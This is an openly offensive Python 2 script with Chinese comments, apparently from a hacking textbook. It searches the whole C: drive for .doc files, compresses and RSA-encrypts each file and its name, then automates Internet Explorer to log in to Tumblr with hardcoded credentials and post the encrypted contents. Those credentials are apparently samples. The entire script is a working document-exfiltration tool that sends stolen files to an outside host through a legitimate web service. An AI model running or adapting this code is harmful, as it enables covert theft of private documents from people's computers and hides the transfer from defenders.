#!/usr/bin/python
#-*- coding:utf-8 -*-

import win32com.client
import os
import fnmatch
import time
import random
import zlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type   = ".doc"
username   = "jms@bughunter.ca"
password   = "justinBHP2014"
public_key = ""

#等待浏览器加载完页面
def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

#压缩数据，先使用zlib，在使用公钥，最后使用base64
def encrypt_string(plaintext):
    chunk_size = 256
    print "Compressing: %d bytes" % len(plaintext)
    #使用zlib进行压缩
    plaintext = zlib.compress(plaintext)
    print "Encrypting %d bytes" % len(plaintext)

    #导入公钥
    rsakey = RSA.importKey(public_key)
    #加密对象
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = " "
    offset    = 0

    #RSA加密数据块的最大值为256
    while offset < len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]
        #如果最后一段不够256字节，使用空格填充
        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))
        encrypted += rsakey.encrypt(chunk)
        offset    += chunk_size

    #使用base64再次编码
    encrypted = encrypted.encode("base64")
    print "Base64 encoded crypto: %d" % len(encrypted)
    return encrypted

#打开文件，调用加密函数
def encrypt_post(filename):
    fd = open(filename,"rb")
    contents = fd.read()
    fd.close()
    #加密文件数据和文件名
    encrypted_title = encrypt_string(filename)
    encrypted_body  = encrypt_string(contents)

    return encrypted_title,encrypted_body

#随机休眠，等待没有通过注册DOM对象的事件作为信号的任务完成
def random_sleep():
    time.sleep(random.randint(5,10))
    return

#登录到tumblr
def login_to_tumblr(ie):
    #解析文档所有元素，包括每一个标签
    full_doc = ie.Document.all
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value",username)
        elif i.id == "signup_password":
            i.setAttribute("value",password)
    random_sleep()

    try:
        #所有form元素
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError, e:
        pass
    random_sleep()
    wait_for_browser(ie)
    return

#解析元素，填写提交内容
def post_to_tumblr(ie,title,post):
    full_doc = ie.Document.all
    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value",title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML",post)
            print "Set text area"
            i.focus()
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            #记录提交按钮的位置
            i.focus()

    random_sleep()

    title_box.focus()
    random_sleep()

    #点击提交
    post_form.children[0].click()
    wait_for_browser(ie)
    random_sleep()
    return

#处理主函数，找到文档后，传入路径参数
def exfiltrate(document_path):
    #打开IE
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    #设置为1可见，0不可见
    ie.Visible = 1
    #访问tumblr网站
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)
    print "Logging in..."

    #调用登录函数，传入IE实例，解析登录表单并填写提交
    login_to_tumblr(ie)
    print "Logged in...navigating"
    #访问发表文章的路径
    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    #调用encrypt_post打开文档，返回加密后的文件名和内容
    title,body = encrypt_post(document_path)
    print "Creating new post..."

    #解析发表表单，启用javascript提交
    post_to_tumblr(ie,title,body)
    print "Posted!"
    #销毁IE实例
    ie.Quit()
    ie = None
    return

#寻找路径下符合后缀名的文件
for parent, directories, filenames in os.walk("C:\\"):
    #filter传入合集，及关键字，返回符合的文件列表
    for filename in fnmatch.filter(filenames,"*%s" % doc_type):
        document_path = os.path.join(parent,filename)
        print "Found: %s" % document_path
        #调用主函数exfiltrate
        exfiltrate(document_path)
        raw_input("Continue?")
